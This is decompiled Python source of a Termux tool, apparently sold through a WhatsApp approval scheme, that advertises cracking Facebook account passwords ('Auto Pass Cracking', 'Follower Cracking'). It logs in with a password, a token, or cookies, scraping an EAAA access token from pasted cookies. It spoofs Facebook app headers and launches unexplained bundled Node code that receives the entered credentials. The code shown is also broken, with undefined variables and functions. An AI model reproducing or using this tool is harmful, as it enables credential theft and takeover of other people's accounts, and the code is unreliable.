# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: koNtol
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'SHADOW-HACKET'
__copyright = 'All rights reserved . Copyright  Abid'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

try:
    os.mkdir('/sdcard/ids/ex_ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')

def logo():
    os.system('echo -e "\n       _____    ____      __  __   _____ \n      / ____|  / __ \\    |  \\/  | |_   _|\n     | (___   | |  | |   | \\  / |   | |  \n      \\___ \\  | |  | |   | |\\/| |   | |  \n      ____) | | |__| |   | |  | |  _| |_ \n     |_____/   \\____/    |_|  |_| |_____| Primium\n\n\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f We hope to see You again \xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \n\n\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n\n\xe2\x8b\x9f Devolper     \xe2\x97\x8f    Usama Awan (somi)\n\xe2\x8b\x9f WhatsApp     \xe2\x97\x8f    03455453538\n\xe2\x8b\x9f Tool Type    \xe2\x97\x8f    Cloning Tool\n\n\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n" | lolcat')


def logo1():
    os.system('echo -e "\n\n(1) Login With id/pass \n\n(2) Login With Token\n\n(3) Login Cookies" | lolcat')


def logo2():
    os.system('echo -e "\n\n(1) Auto Pass Cracking (40%)\n\n(2) Digit Pass Cracking (100%)\n\n(3) Name Pass Cloning (70%) \n\n" | lolcat')


def logo3():
    os.system('echo -e "\n\n(1) Public Friendlist Crack (50%) \n\n(2) Follower Cracking (100%)\n\n(3) File Cloning" | lolcat')


def logo4():
    os.system('echo -e "\n\n(1) Public Friendlist Crack (50%) \n\n(2) File Cracking (100%)\n\n(0) Close Program" | lolcat')


idg = []

def reg():
    os.system('clear')
    logo()
    print ''
    os.system('echo -e "\n\n\xe2\x8b\x9f The Approval For Login" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Buy This Tool And Enjoy " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Checking approval...." | lolcat')
    time.sleep(1)
    try:
        to = open('/sdcard/.jtgbswqlbbfvmoodfvzshbbbffhhjuujjjjhjjjjqbbwjjjrrrttunddbsdbdfsaakkkvffteu3beb.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/shadow-hackr/primium/main/.server.txt').text
    if to in r:
        os.system('cd somi && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd shadow && node index.js &')
        time.sleep(5)
        g()
    else:
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\n\n\xe2\x8b\x9f  Approved Failed" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f  Your key is Not Approved" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f  Copy The id and send to Tool owner" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f The Approval For Login" | lolcat')
        print '\x1b[0;31m\xe2\x8b\x9f \x1b[1;92mYour id: \x1b[0;36m' + to
        raw_input('\x1b[0;31m\xe2\x8b\x9f\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923425081910')
        reg()


def reg2():
    os.system('clear')
    logo()
    os.system('echo -e "\n\n\xe2\x8b\x9f Approval not detected" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Copy Your Key and Press Enter" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Select Whatsaap To Countinue" | lolcat')
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923425081910')
    sav = open('/sdcard/.ids.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def g():
    os.system('clear')
    logo()
    print '\x1b[1;91mTool Verification'
    print
    ip = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Your-ip :  ')
    if ip == '45678-0':
        os.system('clear')
        logo()
        print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Your-ip : (Confirmed)'
        ss = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Tool-ip : ')
        if ss == '82814-8':
            os.system('clear')
            logo()
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Your-ip : (Confirmed)'
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Tool-ip : (Confirmed)'
            time.sleep(1)
            print ''
            print '\x1b[1;92m \xe2\x9c\x93 \x1b[1;93m All Set'
            time.sleep(1)
            login_menu()
        else:
            print '[!] Tool-ip : ' + ss + ' (Wrong)'
            time.sleep(1)
            g()
    else:
        print '[!] Tool-ip : ' + ip + ' (Wrong)'
        time.sleep(1)
        g()


def login_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        logo()
        os.system('echo -e "-------LOGIN MENU-------" | lolcat')
        logo1()
        print 47 * '-'
        log_menu_s()


def log_menu_s():
    s = raw_input('\x1b[1;96m>> ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    logo()
    print '   \x1b[101m\x1b[37;1mLOGIN Fb-ID\x1b[0m'
    print
    lid = raw_input('\x1b[1;92m Id/mail/no: ')
    pwds = raw_input(' \x1b[1;93mPassword: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ' User must verify account before login'
            raw_input('\x1b[1;92m Press enter to try again ')
            log_fb()
        else:
            print ' Id/Pass may be wrong'
            raw_input(' \x1b[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')


def log_token():
    os.system('clear')
    logo()
    print '   \x1b[101m\x1b[37;1mLOGIN FB-TOKEN\x1b[0m'
    print 47 * '-'
    tok = raw_input('\x1b[1;92mPaste Token : \x1b[1;91m')
    print 47 * '-'
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    logo()
    print '   \x1b[101m\x1b[37;1mLOGIN FB-COOKIES\x1b[0m'
    print ''
    print ''
    try:
        cookie = raw_input(' Paste cookies : ')
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\x1b[1;31;1mLogin FB id to continue'
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    logo()
    print '\t    \x1b[1;33mWellCome \x1b[0;97m'
    print 47 * '-'
    logo2()
    print 47 * '-'
    menu_s()
